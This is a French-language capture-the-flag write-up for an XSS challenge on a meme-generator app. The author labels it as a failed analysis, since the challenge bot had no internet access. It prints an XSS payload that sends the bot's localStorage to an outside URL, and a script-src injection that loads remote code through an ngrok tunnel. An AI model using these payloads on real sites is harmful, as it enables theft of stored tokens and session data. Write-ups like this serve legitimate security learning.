# Mauvaise analyse

Cette analyse a été faite sans avoir tenu compte de la mention **"le bot n'a pas accès à internet"** dans l'énoncé.
Il n'est donc pas possible d'appliquer ce qui à été fait ici dans la pratique.
Voici ce qui rend cette solution inapplicable :
1. Le bot ne peut pas récupérer le script hébergé
2. Le bot ne peut pas envoyer le résultat vers un serveur externe

## Analyse

- Application web : https://meme-generator.fcsc.fr/

Il est indiqué que le bot accessible possède le flag dans son localStorage.

On va alors essayer de faire une attaque XSS via le formulaire de création de meme.

## XSS

- On récupère tous les éléments du localStorage et on les envoie à l'URL de notre choix.

```html
<script>
    document.location.href = 'https://example.com/'+JSON.stringify(localStorage);
</script>
```

Problème : Le contenu de ce qu'on envoie lors de la requête pour le XSS est réécris en majuscules. Donc les mots clés ( tels que `document` etc...) ne sont plus reconnus...

> On pourrait alors essayer de faire une obfuscation pour que la casse n'impacte pas le bon fonctionnement du script ???\
> Tentatives infructueuses...

### Et ensuite ?

Une fois cette solution trouvée, on pourra simplement utiliser le bot pour faire la requête vers le site avec notre injection XSS

```zsh
nc chall.fcsc.fr 2210
```

### Nouvelle solution (sauf que non)

On peut alors essayer de ne pas passer directement le script pour qu'il ne soit pas altéré !

```html
<script src="https://example.com/script.js"></script>
```
Le script contiendra alors le code d'injection XSS.

#### Hébergement du script

On va alors héberger le script sur un serveur pour qu'il soit accessible par le site.

On crée donc un fichier `server.js` faisant office de serveur pour envoyer notre script (cf. `script.js`)

On peut rendre disponible notre server en local avec `ngrok` :

```zsh
ngrok http 3000
```

On va alors récupérer l'URL publique de ngrok et l'utiliser dans notre injection XSS.

```html
<script src="https://xxx.ngrok-free.app/SCRIPT.JS"></script>
```

Sauf quuuueeeee... Merci à la phrase **"le bot n'a pas accès à internet"** dans l'énoncé 😆
Il faudra m'apprendre à lire un jour...